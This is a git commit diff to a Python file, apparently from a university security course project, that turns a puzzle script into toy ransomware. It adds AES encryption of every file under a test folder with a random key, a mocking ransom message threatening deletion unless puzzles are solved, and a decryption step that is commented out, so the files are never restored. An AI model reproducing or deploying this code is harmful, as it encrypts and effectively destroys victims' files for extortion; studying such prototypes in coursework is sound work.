76b94996ba95de1690adb8f14c6d64af0254ecf2
Shayna Kapadia <shaynak2@illinois.edu>
2019-05-10 21:11:31 -0500

    done

--- puzzles.py
+++ puzzles.py
@@ -1,4 +1,51 @@
-# print("There was a man who was born before his father, killed his mother, and married his sister. Yet, there was nothing wrong with what he had done. Why?");
+import os
+import pathlib
+import random
+import struct
+from Crypto.Cipher import AES
+from pprint import pprint
+import sys
+
+def encrypt_file(key, in_filename):
+    out_filename = in_filename + '.enc'
+    iv = ''.join(random.choice('0123456789') for n in range(16))
+    print(sys.getsizeof(iv[1]))
+    encryptor = AES.new(key, AES.MODE_CBC, iv)
+    filesize = os.path.getsize(in_filename)
+    chunksize = 64*1024
+    with open(in_filename, 'rb') as infile:
+        with open(out_filename, 'wb') as outfile:
+            outfile.write(struct.pack('<Q', filesize))
+            outfile.write(iv.encode('utf-8'))
+            while True:
+                chunk = infile.read(chunksize)
+                if len(chunk) == 0:
+                    break
+                elif len(chunk) % 16 != 0:
+                    chunk += (' ' * (16 - len(chunk) % 16)).encode('utf-8')
+
+                outfile.write(encryptor.encrypt(chunk))
+
+
+def decrypt_file(key, in_filename):
+    chunksize=24*1024
+    out_filename = os.path.splitext(in_filename)[0]
+
+    with open(in_filename, 'rb') as infile:
+        origsize = struct.unpack('<Q', infile.read(struct.calcsize('Q')))[0]
+        iv = infile.read(16)
+        decryptor = AES.new(key, AES.MODE_CBC, iv)
+
+        with open(out_filename, 'wb') as outfile:
+            while True:
+                chunk = infile.read(chunksize)
+                if len(chunk) == 0:
+                    break
+                outfile.write(decryptor.decrypt(chunk))
+
+            outfile.truncate(origsize)
+
+
 def puzzleOne():
     answer = ""
     check = 0
@@ -69,7 +116,31 @@ def puzzleThree():
     return 0;
 
 # Call encryption function here
-# call key encryption function here
+
+user_home = pathlib.Path.home()
+target_folder = "dev/cs460/finalProject/testFolder"
+start_path = os.path.join(user_home, target_folder)
+print("Running folder scan on " + start_path)
+
+dir_list = []
+file_list = []
+key  = ''.join(random.choice('0123456789abcdef') for n in range(32))
+for root, dirs, files in os.walk(start_path):
+    for name in files:
+        # print(os.path.join(root, name))
+        encrypt_file(key, os.path.join(root, name))
+        file_list.append(os.path.join(root, name))
+    for name in dirs:
+        # print(os.path.join(root, name))
+        #encrypt_file(key, os.path.join(root, name))
+        dir_list.append(os.path.join(root, name))
+
+print("\nDirectories:")
+print(dir_list)
+print("\nFolders:")
+pprint(file_list)
+
+
 num = 0;
 print("You've been HACKED! \nSoRrY bUt AlL yOuR fIlEs HaVe bEeN eNcRyPtEd. \nIf YoU wAnT tHeM bAcK, sOlVe thEsE pUzZleS. OThErwIse, wE'lL delEte EveRytHinG!")
 num = num + puzzleOne()
@@ -78,7 +149,9 @@ if(num == 1):
     if(num == 2):
         num = num + puzzleThree()
 if(num == 3):
-    # decrypt files here
+    # for root, dirs, files in os.walk(start_path):
+    #     for name in file_list:
+    #         decrypt_file(key, name)
     print("Your files have been decrypted, enjoy your day!\n")
 else:
     print("Sorry, all your files are gone.\n")
